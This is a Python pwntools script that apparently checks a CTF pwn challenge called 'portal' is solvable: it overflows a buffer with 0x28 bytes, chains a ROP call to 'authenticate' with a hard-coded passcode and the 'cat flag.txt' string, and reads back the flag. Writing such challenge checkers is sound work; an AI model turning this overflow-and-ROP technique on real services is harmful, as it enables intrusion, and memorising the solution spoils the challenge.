from pwn import *

from inspectors.pwn import PwnChallengeInspector


class PortalInspector(PwnChallengeInspector):
    def solve(self) -> bool:
        context.log_level = 'CRITICAL'
        context.binary = 'distfiles/portal/chall'

        try:
            elf = ELF('distfiles/portal/chall', checksec=False)
            rop = ROP([elf])

            passcode = 0xc0ffee
            cat_flag_txt_addr = next(elf.search(b'cat flag.txt'))

            rop.raw('A' * 0x28)
            rop.call('authenticate', [passcode, cat_flag_txt_addr])
            payload = rop.chain()

            io = remote(self.host, self.port, level='CRITICAL')
            io.sendline(payload)
            assert self.flag in io.recvall().decode()

            self.logger.info(self.msg_succeeded_to_solve())
            return True

        except:
            self.logger.warning(self.msg_failed_to_solve())
            return False
